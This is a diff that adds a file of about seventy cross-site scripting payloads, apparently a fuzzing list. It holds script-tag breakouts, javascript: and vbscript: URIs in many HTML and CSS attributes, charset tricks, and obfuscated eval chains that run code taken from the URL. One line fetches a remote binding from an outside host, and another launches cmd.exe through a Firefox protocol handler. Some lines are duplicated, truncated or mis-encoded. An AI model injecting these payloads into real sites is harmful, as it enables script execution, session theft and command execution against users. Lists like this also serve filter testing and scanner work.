@@ -1,0 +1,72 @@
+<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+*/a=eval;b=alert;a(b(/e/.source));/*
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+\";alert('XSS');//
+/<script((\s+\w+(\s*=\s*(?:â€(.)*?â€|'(.)*?'|[^'â€>\s]+))?)+\s*|\s*)src/i
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+'';!--"<script>alert(0);</script>=&{(alert(1))}
+style=color: expression(alert(0));" a="
+vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;
+s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);
+s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];
+s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;
+s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';
+<BR SIZE="&{alert('XSS')}">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name
+setTimeout// (name// ,0)
+test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa
+123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);s1=<s>evalalerta(1)a</s>,s2=<s></s>+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)
+___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";eval(a+b+c+d);
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+alert(1)
+s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+'';u1=s1+s2+s3;URL=u1
+<SCRIPT>alert('XSS')</SCRIPT>
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))
+a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))
+eval.call(this,unescape.call(this,location))
+d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))
+l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a
+_=eval,__=unescape,___=document.URL,_(__(___))
+$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)
+with(location)with(hash)eval(substring(1))
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+A=alert;A(1)
+<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+http://aa'><script>alert(123)</script>
+http://aa"><script>alert(123)</script>
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+with(document.__parent__)alert(1)
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+y=<a>alert</a>;content[y](123)
+'';!--"<XSS>=&{()}
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
